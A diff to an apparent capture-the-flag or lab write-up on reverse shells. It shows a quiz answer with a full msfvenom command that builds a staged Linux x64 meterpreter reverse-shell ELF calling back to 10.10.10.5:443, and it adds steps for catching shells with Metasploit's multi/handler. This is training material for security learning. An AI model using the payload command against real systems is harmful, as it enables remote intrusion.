@@ -520,3 +520,16 @@ This gives us a full set of Linux meterpreter payloads for 32bit targets.
 *What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell**  
 *Answer:* msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443
 
+### Task 10
+
+Multi/Handler is a superb tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.
+
+Fortunately, it's relatively easy to use:  
+
+Open Metasploit with msfconsole  
+Type use multi/handler, and press enter  
+We are now primed to start a multi/handler session. Let's take a look at the available options using the options command:  
+
+<img width="719" height="384" alt="image" src="https://github.com/user-attachments/assets/bff290f7-80ef-4dba-8689-3e823873bf54" />
+
+
